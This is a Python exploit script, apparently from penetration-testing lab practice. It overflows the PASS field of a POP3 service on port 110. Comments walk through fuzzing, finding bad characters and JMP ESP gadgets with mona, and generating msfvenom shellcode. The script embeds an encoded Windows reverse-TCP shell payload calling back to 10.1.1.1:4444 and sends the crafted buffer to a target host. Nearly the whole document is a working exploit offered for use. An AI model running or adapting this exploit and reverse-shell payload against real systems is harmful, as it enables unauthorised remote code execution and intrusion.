#!/usr/bin/python
import socket, struct

#Buffer overflow creation

BOF_len = 250 #Attach to process with immunity, run fuzzer.py, until you catch an exception.

#Then run pattern_finder.py, and run pattern_offset with EIP value to know the exact size.
#You can also !mona findmsp

JUNK = "A"*BOF_len

#BadChars "\x00\x0a\x0d"

#Find BadChars with mona:
    #Run bad_chars.py
    #Transfer the generated all_chars.bin to the test machine "for mona"
    #Look for the address on memory after BBBB - bad chars might start in the middle of address, so add 1-3 accordingly
    #!mona compare -f C:\users\administrator\desktop\all_chars.bin -a 01501A96 "address from above"
    #Mona will highlight bad char with 00 or -1 or b0 under it, also will list of corrupted characters "sometimes initial list is inaccurate"
    #Then add bad character to bad_chars.py and repeat until you get all chars back

#shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.1 LPORT=4444 -f py -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -v shellcode
#Payload size: 351 bytes

shellcode =  ""
shellcode += "\xdb\xce\xd9\x74\x24\xf4\x58\xbd\xb2\xb8\x4c\xb7"
shellcode += "\x31\xc9\xb1\x52\x31\x68\x17\x83\xc0\x04\x03\xda"
shellcode += "\xab\xae\x42\xe6\x24\xac\xad\x16\xb5\xd1\x24\xf3"
shellcode += "\x84\xd1\x53\x70\xb6\xe1\x10\xd4\x3b\x89\x75\xcc"
shellcode += "\xc8\xff\x51\xe3\x79\xb5\x87\xca\x7a\xe6\xf4\x4d"
shellcode += "\xf9\xf5\x28\xad\xc0\x35\x3d\xac\x05\x2b\xcc\xfc"
shellcode += "\xde\x27\x63\x10\x6a\x7d\xb8\x9b\x20\x93\xb8\x78"
shellcode += "\xf0\x92\xe9\x2f\x8a\xcc\x29\xce\x5f\x65\x60\xc8"
shellcode += "\xbc\x40\x3a\x63\x76\x3e\xbd\xa5\x46\xbf\x12\x88"
shellcode += "\x66\x32\x6a\xcd\x41\xad\x19\x27\xb2\x50\x1a\xfc"
shellcode += "\xc8\x8e\xaf\xe6\x6b\x44\x17\xc2\x8a\x89\xce\x81"
shellcode += "\x81\x66\x84\xcd\x85\x79\x49\x66\xb1\xf2\x6c\xa8"
shellcode += "\x33\x40\x4b\x6c\x1f\x12\xf2\x35\xc5\xf5\x0b\x25"
shellcode += "\xa6\xaa\xa9\x2e\x4b\xbe\xc3\x6d\x04\x73\xee\x8d"
shellcode += "\xd4\x1b\x79\xfe\xe6\x84\xd1\x68\x4b\x4c\xfc\x6f"
shellcode += "\xac\x67\xb8\xff\x53\x88\xb9\xd6\x97\xdc\xe9\x40"
shellcode += "\x31\x5d\x62\x90\xbe\x88\x25\xc0\x10\x63\x86\xb0"
shellcode += "\xd0\xd3\x6e\xda\xde\x0c\x8e\xe5\x34\x25\x25\x1c"
shellcode += "\xdf\x40\xbb\x1f\x1e\x3d\xb9\x1f\x31\xe1\x34\xf9"
shellcode += "\x5b\x09\x11\x52\xf4\xb0\x38\x28\x65\x3c\x97\x55"
shellcode += "\xa5\xb6\x14\xaa\x68\x3f\x50\xb8\x1d\xcf\x2f\xe2"
shellcode += "\x88\xd0\x85\x8a\x57\x42\x42\x4a\x11\x7f\xdd\x1d"
shellcode += "\x76\xb1\x14\xcb\x6a\xe8\x8e\xe9\x76\x6c\xe8\xa9"
shellcode += "\xac\x4d\xf7\x30\x20\xe9\xd3\x22\xfc\xf2\x5f\x16"
shellcode += "\x50\xa5\x09\xc0\x16\x1f\xf8\xba\xc0\xcc\x52\x2a"
shellcode += "\x94\x3e\x65\x2c\x99\x6a\x13\xd0\x28\xc3\x62\xef"
shellcode += "\x85\x83\x62\x88\xfb\x33\x8c\x43\xb8\x44\xc7\xc9"
shellcode += "\xe9\xcc\x8e\x98\xab\x90\x30\x77\xef\xac\xb2\x7d"
shellcode += "\x90\x4a\xaa\xf4\x95\x17\x6c\xe5\xe7\x08\x19\x09"
shellcode += "\x5b\x28\x08"


BUFFER = 3500 #To fix max buffer size, just in case

#Modules: !mona modules -- Look for no DEP, NX, ASLR && No Bad Char in address
         #go to the module "e then double click module"
          #!mona find -s esp -m MODULE.dll -cpb "\x00\x0a" "look for JMP ESP or PUSH ESP RETN"
         #if no DEP, you can try "./nasm_shell JMP ESP > FFE4"
          #!mona find -s "\xff\xe4" -m MODULE.dll -cpb "\x00\x0a"
         #Ensure JMP ESP by following address in disassembler "click on it then hit enter"
         #You can also try !mona suggest to see what would work

#ESP = "\x8f\x35\x4a\x5f" #little endian format 5F4A358F
ESP = struct.pack("<I", 0x5F4A358F)

NOP = "\x90"*16 #add a few just in case you don't directly hit ESP
#You can otherwise use "\x83\xec\x10" instead, from "./nasm_shell sub esp,0x10"

extraSpace = BUFFER - BOF_len - len(shellcode) - len(NOP) - len(ESP)

buf = JUNK + ESP + NOP + shellcode + "C"*extraSpace

#start socket connection and send bof
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.13.8',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buf + '\r\n')
	s.close()
	print "\nDone. Did you get a reverse shell?"
except:
	print "Could not connect to port!"
